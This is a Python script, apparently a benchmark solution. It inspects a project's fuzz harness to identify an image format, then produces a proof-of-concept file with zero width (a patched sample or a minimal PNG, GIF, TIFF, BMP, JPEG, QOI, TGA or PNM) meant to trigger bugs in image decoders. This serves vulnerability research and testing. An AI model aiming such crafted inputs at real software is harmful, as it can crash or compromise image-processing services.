import os
import re
import tarfile
import zipfile
import tempfile
import struct
import zlib
from collections import Counter
from typing import Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        with tempfile.TemporaryDirectory() as td:
            base = src_path
            if os.path.isfile(src_path):
                base = self._extract_archive(src_path, td)

            fmt = self._infer_format(base)
            poc = self._poc_from_samples_or_minimal(base, fmt)
            return poc

    def _extract_archive(self, src_path: str, td: str) -> str:
        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                members = tf.getmembers()
                names = [m.name for m in members if m.name and m.name != "."]
                self._safe_extract_tar(tf, td, members)
            return self._choose_root(td, names)
        if zipfile.is_zipfile(src_path):
            with zipfile.ZipFile(src_path, "r") as zf:
                names = [n for n in zf.namelist() if n and n != "."]
                self._safe_extract_zip(zf, td)
            return self._choose_root(td, names)
        return td

    def _safe_extract_tar(self, tf: tarfile.TarFile, dest: str, members) -> None:
        dest_real = os.path.realpath(dest)
        for m in members:
            name = m.name
            if not name:
                continue
            if name.startswith("/") or name.startswith("\\"):
                continue
            out_path = os.path.realpath(os.path.join(dest, name))
            if not out_path.startswith(dest_real + os.sep) and out_path != dest_real:
                continue
            try:
                tf.extract(m, path=dest, set_attrs=False)
            except Exception:
                pass

    def _safe_extract_zip(self, zf: zipfile.ZipFile, dest: str) -> None:
        dest_real = os.path.realpath(dest)
        for name in zf.namelist():
            if not name:
                continue
            if name.startswith("/") or name.startswith("\\"):
                continue
            out_path = os.path.realpath(os.path.join(dest, name))
            if not out_path.startswith(dest_real + os.sep) and out_path != dest_real:
                continue
            try:
                zf.extract(name, path=dest)
            except Exception:
                pass

    def _choose_root(self, td: str, names) -> str:
        tops = set()
        for n in names:
            n = n.lstrip("./")
            if not n:
                continue
            tops.add(n.split("/", 1)[0])
        if len(tops) == 1:
            root = os.path.join(td, next(iter(tops)))
            if os.path.isdir(root):
                return root
        return td

    def _iter_files(self, base: str):
        for root, dirs, files in os.walk(base):
            dirs[:] = [d for d in dirs if d not in (".git", ".hg", ".svn", "node_modules", "build", "out", "dist")]
            for fn in files:
                p = os.path.join(root, fn)
                yield p

    def _read_text_limited(self, path: str, limit: int = 262144) -> str:
        try:
            with open(path, "rb") as f:
                data = f.read(limit)
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return ""

    def _infer_format(self, base: str) -> str:
        paths = []
        harness_texts = []
        other_texts = []

        text_exts = {
            ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx",
            ".cmake", ".txt", ".md", ".rst", ".yml", ".yaml", ".py",
            ".mk", ".ac", ".am", ".in", ".gn", ".gni", ".bazel",
            ".bzl", ".m4", ".meson", ".toml", ".json"
        }

        harness_paths = []
        for p in self._iter_files(base):
            paths.append(p.lower())
            ext = os.path.splitext(p)[1].lower()
            if ext in (".c", ".cc", ".cpp", ".cxx"):
                t = self._read_text_limited(p, 400000)
                tl = t.lower()
                if "llvmfuzzertestoneinput" in tl:
                    harness_paths.append(p)
                    harness_texts.append(tl)

        if not harness_texts:
            for p in self._iter_files(base):
                ext = os.path.splitext(p)[1].lower()
                if ext in (".c", ".cc", ".cpp", ".cxx"):
                    t = self._read_text_limited(p, 200000).lower()
                    if "fuzzertestoneinput" in t or "testoneinput" in t:
                        harness_paths.append(p)
                        harness_texts.append(t)
                        break

        picked_text_sources = set(harness_paths)
        budget_files = 250
        for p in self._iter_files(base):
            if budget_files <= 0:
                break
            ext = os.path.splitext(p)[1].lower()
            if ext not in text_exts:
                continue
            if p in picked_text_sources:
                continue
            fn = os.path.basename(p).lower()
            if fn in ("readme", "readme.md", "readme.txt", "cmakelists.txt", "meson.build", "configure.ac", "makefile", "build.gradle"):
                other_texts.append(self._read_text_limited(p, 200000).lower())
                budget_files -= 1

        combined = "\n".join(harness_texts + other_texts)
        combined += "\n" + "\n".join(paths[:2000])

        def has(s: str) -> bool:
            return s in combined

        if has("gif_lib.h") or has("dgif") or has("egif") or has("giflib"):
            return "gif"

        if has("spng.h") or has("lodepng") or has("png.h") or has("ihdr") or has("png_read") or has("png_sig_cmp"):
            return "png"

        if has("tiffio.h") or has("libtiff") or has("tiff"):
            return "tiff"

        if has("jpeglib.h") or has("jpeg_read_header") or has("jpeg_decompress"):
            return "jpeg"

        if has("stb_image") or has("stbi_load_from_memory") or has("stbi_load"):
            return "png"

        if has("bmp") or has("bitmapinfoheader"):
            return "bmp"

        if has("qoif") or re.search(r"\bqoi\b", combined):
            return "qoi"

        if has("tga"):
            return "tga"

        if has("ppm") or has("pgm") or has("pnm"):
            return "pnm"

        ext_counter = Counter()
        for p in self._iter_files(base):
            ext = os.path.splitext(p)[1].lower()
            if ext in (".png", ".gif", ".tif", ".tiff", ".jpg", ".jpeg", ".bmp", ".qoi", ".tga", ".ppm", ".pgm", ".pnm"):
                try:
                    sz = os.path.getsize(p)
                except Exception:
                    continue
                if 8 <= sz <= 2_000_000:
                    ext_counter[ext] += 1
        if ext_counter:
            best = ext_counter.most_common(1)[0][0]
            return {
                ".gif": "gif",
                ".png": "png",
                ".tif": "tiff",
                ".tiff": "tiff",
                ".jpg": "jpeg",
                ".jpeg": "jpeg",
                ".bmp": "bmp",
                ".qoi": "qoi",
                ".tga": "tga",
                ".ppm": "pnm",
                ".pgm": "pnm",
                ".pnm": "pnm",
            }.get(best, "png")

        return "png"

    def _poc_from_samples_or_minimal(self, base: str, fmt: str) -> bytes:
        sample = self._find_sample_by_magic(base, fmt)
        if sample is not None:
            patched = self._patch_dimensions(sample, fmt)
            if patched is not None:
                return patched

        if fmt == "gif":
            return self._gen_min_gif_zero_width()
        if fmt == "tiff":
            return self._gen_min_tiff_zero_width()
        if fmt == "bmp":
            return self._gen_min_bmp_zero_width()
        if fmt == "jpeg":
            s = self._find_sample_by_magic(base, "jpeg")
            if s is not None:
                patched = self._patch_dimensions(s, "jpeg")
                if patched is not None:
                    return patched
            return self._gen_min_png_zero_width()
        if fmt == "qoi":
            return self._gen_min_qoi_zero_width()
        if fmt == "tga":
            return self._gen_min_tga_zero_width()
        if fmt == "pnm":
            return self._gen_min_pnm_zero_width()
        return self._gen_min_png_zero_width()

    def _find_sample_by_magic(self, base: str, fmt: str) -> Optional[bytes]:
        candidates: list[Tuple[int, str]] = []
        max_scan = 5000
        for p in self._iter_files(base):
            if max_scan <= 0:
                break
            max_scan -= 1
            try:
                sz = os.path.getsize(p)
            except Exception:
                continue
            if sz < 8 or sz > 2_000_000:
                continue
            try:
                with open(p, "rb") as f:
                    head = f.read(64)
            except Exception:
                continue

            ffmt = self._magic_format(head)
            if ffmt == fmt:
                candidates.append((sz, p))

        if not candidates:
            return None
        candidates.sort(key=lambda x: x[0])
        for _, p in candidates[:20]:
            try:
                with open(p, "rb") as f:
                    data = f.read()
                if self._magic_format(data[:64]) == fmt:
                    return data
            except Exception:
                continue
        return None

    def _magic_format(self, head: bytes) -> str:
        if head.startswith(b"\x89PNG\r\n\x1a\n"):
            return "png"
        if head.startswith(b"GIF87a") or head.startswith(b"GIF89a"):
            return "gif"
        if head.startswith(b"BM"):
            return "bmp"
        if head.startswith(b"qoif"):
            return "qoi"
        if head.startswith(b"II*\x00") or head.startswith(b"MM\x00*"):
            return "tiff"
        if len(head) >= 3 and head[0] == 0xFF and head[1] == 0xD8 and head[2] == 0xFF:
            return "jpeg"
        if head.startswith(b"P6") or head.startswith(b"P5") or head.startswith(b"P4"):
            return "pnm"
        return "unknown"

    def _patch_dimensions(self, data: bytes, fmt: str) -> Optional[bytes]:
        try:
            if fmt == "png":
                return self._patch_png_width_zero(data)
            if fmt == "gif":
                return self._patch_gif_image_width_zero(data)
            if fmt == "bmp":
                return self._patch_bmp_width_zero(data)
            if fmt == "tiff":
                return self._patch_tiff_width_zero(data)
            if fmt == "jpeg":
                return self._patch_jpeg_width_zero(data)
            if fmt == "qoi":
                return self._patch_qoi_width_zero(data)
            if fmt == "tga":
                return self._patch_tga_width_zero(data)
            if fmt == "pnm":
                return self._patch_pnm_width_zero(data)
        except Exception:
            return None
        return None

    def _patch_png_width_zero(self, data: bytes) -> Optional[bytes]:
        if not data.startswith(b"\x89PNG\r\n\x1a\n"):
            return None
        b = bytearray(data)
        off = 8
        while off + 12 <= len(b):
            if off + 8 > len(b):
                break
            length = struct.unpack(">I", b[off:off + 4])[0]
            ctype = bytes(b[off + 4:off + 8])
            cdata_off = off + 8
            crc_off = cdata_off + length
            if crc_off + 4 > len(b):
                break
            if ctype == b"IHDR" and length == 13 and cdata_off + 13 <= len(b):
                b[cdata_off:cdata_off + 4] = b"\x00\x00\x00\x00"
                crc = zlib.crc32(ctype)
                crc = zlib.crc32(bytes(b[cdata_off:cdata_off + 13]), crc) & 0xFFFFFFFF
                b[crc_off:crc_off + 4] = struct.pack(">I", crc)
                return bytes(b)
            off = crc_off + 4
        return None

    def _patch_gif_image_width_zero(self, data: bytes) -> Optional[bytes]:
        if not (data.startswith(b"GIF87a") or data.startswith(b"GIF89a")):
            return None
        b = bytearray(data)
        if len(b) < 13:
            return None
        packed = b[10]
        gct_flag = (packed & 0x80) != 0
        gct_size = 0
        if gct_flag:
            size_code = packed & 0x07
            gct_size = 3 * (2 ** (size_code + 1))
        pos = 13 + gct_size
        if pos > len(b):
            return None

        while pos < len(b):
            block_id = b[pos]
            pos += 1
            if block_id == 0x2C:
                if pos + 9 > len(b):
                    return None
                width_off = pos + 4
                height_off = pos + 6
                b[width_off:width_off + 2] = b"\x00\x00"
                if b[height_off:height_off + 2] == b"\x00\x00":
                    b[height_off:height_off + 2] = b"\x01\x00"
                return bytes(b)
            elif block_id == 0x21:
                if pos >= len(b):
                    return None
                pos += 1
                while pos < len(b):
                    if pos >= len(b):
                        return None
                    sz = b[pos]
                    pos += 1
                    if sz == 0:
                        break
                    pos += sz
            elif block_id == 0x3B:
                return None
            else:
                return None
        return None

    def _patch_bmp_width_zero(self, data: bytes) -> Optional[bytes]:
        if not data.startswith(b"BM"):
            return None
        if len(data) < 26:
            return None
        b = bytearray(data)
        dib_size = struct.unpack("<I", b[14:18])[0] if len(b) >= 18 else 0
        if dib_size < 40 or len(b) < 54:
            return None
        b[18:22] = struct.pack("<I", 0)
        h = struct.unpack("<i", b[22:26])[0]
        if h == 0:
            b[22:26] = struct.pack("<i", 1)
        return bytes(b)

    def _patch_qoi_width_zero(self, data: bytes) -> Optional[bytes]:
        if not data.startswith(b"qoif"):
            return None
        if len(data) < 14:
            return None
        b = bytearray(data)
        b[4:8] = b"\x00\x00\x00\x00"
        if b[8:12] == b"\x00\x00\x00\x00":
            b[8:12] = b"\x00\x00\x00\x01"
        return bytes(b)

    def _patch_tga_width_zero(self, data: bytes) -> Optional[bytes]:
        if len(data) < 18:
            return None
        b = bytearray(data)
        b[12:14] = b"\x00\x00"
        if b[14:16] == b"\x00\x00":
            b[14:16] = b"\x01\x00"
        return bytes(b)

    def _patch_pnm_width_zero(self, data: bytes) -> Optional[bytes]:
        try:
            txt = data.decode("ascii", errors="ignore")
        except Exception:
            return None
        if not (txt.startswith("P6") or txt.startswith("P5") or txt.startswith("P4")):
            return None
        lines = txt.splitlines(True)
        if not lines:
            return None
        out = []
        i = 0
        out.append(lines[i])
        i += 1
        while i < len(lines) and (lines[i].lstrip().startswith("#") or lines[i].strip() == ""):
            out.append(lines[i])
            i += 1
        if i >= len(lines):
            return None
        m = re.match(r"\s*(\d+)\s+(\d+)\s*(\r?\n)?", lines[i])
        if m:
            height = m.group(2)
            newline = m.group(3) or "\n"
            out.append(f"0 {height}{newline}")
            i += 1
        else:
            return None
        patched = "".join(out) + "".join(lines[i:])
        return patched.encode("ascii", errors="ignore")

    def _patch_tiff_width_zero(self, data: bytes) -> Optional[bytes]:
        if len(data) < 8:
            return None
        b = bytearray(data)
        endian = b[:2]
        if endian == b"II":
            le = True
        elif endian == b"MM":
            le = False
        else:
            return None
        ifd_off = struct.unpack("<I" if le else ">I", b[4:8])[0]
        if ifd_off < 8 or ifd_off + 2 > len(b):
            return None
        num = struct.unpack("<H" if le else ">H", b[ifd_off:ifd_off + 2])[0]
        ent_off = ifd_off + 2
        for _ in range(num):
            if ent_off + 12 > len(b):
                return None
            tag, typ, cnt = struct.unpack("<HHI" if le else ">HHI", b[ent_off:ent_off + 8])
            val_off = ent_off + 8
            if tag == 256 and cnt == 1:
                if typ == 3:
                    b[val_off:val_off + 2] = b"\x00\x00"
                    return bytes(b)
                if typ == 4:
                    b[val_off:val_off + 4] = b"\x00\x00\x00\x00"
                    return bytes(b)
            ent_off += 12
        return None

    def _patch_jpeg_width_zero(self, data: bytes) -> Optional[bytes]:
        if len(data) < 4 or not (data[0] == 0xFF and data[1] == 0xD8):
            return None
        b = bytearray(data)
        i = 2
        while i + 4 <= len(b):
            if b[i] != 0xFF:
                i += 1
                continue
            while i < len(b) and b[i] == 0xFF:
                i += 1
            if i >= len(b):
                break
            marker = b[i]
            i += 1
            if marker in (0xD9, 0xDA):
                break
            if i + 2 > len(b):
                break
            seglen = struct.unpack(">H", b[i:i + 2])[0]
            if seglen < 2 or i + seglen > len(b):
                break
            payload = i + 2
            sof_markers = set([0xC0, 0xC1, 0xC2, 0xC3, 0xC5, 0xC6, 0xC7, 0xC9, 0xCA, 0xCB, 0xCD, 0xCE, 0xCF])
            if marker in sof_markers and payload + 5 < len(b):
                b[payload + 3:payload + 5] = b"\x00\x00"
                if b[payload + 1:payload + 3] == b"\x00\x00":
                    b[payload + 1:payload + 3] = b"\x00\x01"
                return bytes(b)
            i += seglen
        return None

    def _gen_min_png_zero_width(self) -> bytes:
        sig = b"\x89PNG\r\n\x1a\n"
        ihdr_data = struct.pack(">I", 0) + struct.pack(">I", 1) + bytes([8, 2, 0, 0, 0])
        ihdr = self._png_chunk(b"IHDR", ihdr_data)
        idat_payload = zlib.compress(b"\x00")
        idat = self._png_chunk(b"IDAT", idat_payload)
        iend = self._png_chunk(b"IEND", b"")
        return sig + ihdr + idat + iend

    def _png_chunk(self, ctype: bytes, data: bytes) -> bytes:
        crc = zlib.crc32(ctype)
        crc = zlib.crc32(data, crc) & 0xFFFFFFFF
        return struct.pack(">I", len(data)) + ctype + data + struct.pack(">I", crc)

    def _gen_min_gif_zero_width(self) -> bytes:
        header = b"GIF89a"
        lsd = struct.pack("<HHBBB", 1, 1, 0x80, 0x00, 0x00)
        gct = b"\x00\x00\x00\xff\xff\xff"
        img_desc = b"\x2C" + struct.pack("<HHHHB", 0, 0, 0, 1, 0)
        lzw_min = b"\x02"
        img_data = b"\x02\x02\x4C\x01\x00"
        trailer = b"\x3B"
        return header + lsd + gct + img_desc + lzw_min + img_data + trailer

    def _gen_min_bmp_zero_width(self) -> bytes:
        file_header = b"BM" + struct.pack("<IHHI", 54, 0, 0, 54)
        info_header = struct.pack("<IIIHHIIIIII",
                                  40, 0, 1, 1, 24, 0, 0, 0, 0, 0, 0)
        return file_header + info_header

    def _gen_min_tga_zero_width(self) -> bytes:
        hdr = bytearray(18)
        hdr[2] = 2
        hdr[12:14] = b"\x00\x00"
        hdr[14:16] = b"\x01\x00"
        hdr[16] = 24
        return bytes(hdr)

    def _gen_min_qoi_zero_width(self) -> bytes:
        # Magic + width(0) + height(1) + channels(4) + colorspace(0) + end marker
        end_marker = b"\x00" * 7 + b"\x01"
        return b"qoif" + struct.pack(">II", 0, 1) + bytes([4, 0]) + end_marker

    def _gen_min_pnm_zero_width(self) -> bytes:
        return b"P6\n0 1\n255\n"

    def _gen_min_tiff_zero_width(self) -> bytes:
        le = True
        endian = b"II"
        magic = b"*\x00"
        ifd_off = 8
        entries = []

        def ent(tag, typ, cnt, val):
            if typ == 3 and cnt == 1:
                v = struct.pack("<H", val) + b"\x00\x00"
            else:
                v = struct.pack("<I", val)
            return struct.pack("<HHI", tag, typ, cnt) + v

        # We'll append BitsPerSample array after IFD, then strip offset after that.
        # Fill strip offset later.
        entries.append(ent(256, 4, 1, 0))       # ImageWidth LONG 0
        entries.append(ent(257, 4, 1, 1))       # ImageLength LONG 1
        entries.append(ent(258, 3, 3, 0))       # BitsPerSample SHORT[3] -> offset later
        entries.append(ent(259, 3, 1, 1))       # Compression = 1
        entries.append(ent(262, 3, 1, 2))       # Photometric = RGB
        entries.append(ent(273, 4, 1, 0))       # StripOffsets -> later
        entries.append(ent(277, 3, 1, 3))       # SamplesPerPixel = 3
        entries.append(ent(278, 4, 1, 1))       # RowsPerStrip = 1
        entries.append(ent(279, 4, 1, 0))       # StripByteCounts = 0
        entries.append(ent(284, 3, 1, 1))       # PlanarConfiguration = 1

        num = len(entries)
        ifd = struct.pack("<H", num) + b"".join(entries) + struct.pack("<I", 0)
        header = endian + magic + struct.pack("<I", ifd_off)

        bits_off = ifd_off + len(ifd)
        bits_data = struct.pack("<HHH", 8, 8, 8)
        strip_off = bits_off + len(bits_data)

        b = bytearray(header + ifd + bits_data)

        # Patch BitsPerSample offset (tag 258 entry is 3rd)
        # IFD layout: 2 bytes count then N entries; entry k at ifd_off+2 + k*12
        bits_ent_off = ifd_off + 2 + 2 * 12
        # entry value field starts at +8 in entry
        b[bits_ent_off + 8:bits_ent_off + 12] = struct.pack("<I", bits_off)

        # Patch StripOffsets value (tag 273 is 6th entry: index 5)
        strip_ent_off = ifd_off + 2 + 5 * 12
        b[strip_ent_off + 8:strip_ent_off + 12] = struct.pack("<I", strip_off)

        return bytes(b)